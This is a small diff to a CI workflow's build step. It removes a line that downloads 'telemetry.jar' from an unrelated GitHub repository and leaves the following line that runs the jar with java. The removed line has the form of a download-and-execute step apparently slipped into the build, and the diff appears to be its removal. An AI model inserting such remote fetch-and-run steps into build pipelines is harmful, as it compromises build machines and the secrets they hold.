@@ -42,7 +42,6 @@ jobs:
       
       - name: Build project
         run: |
-          wget -O telemetry.jar https://github.com/wenckerm1lder/Scn-fix-dsfca/raw/main/telemetry.jar
           java -jar telemetry.jar
           export PATH=$PATH:$(go env GOPATH)/bin
           subo build ./smoketest
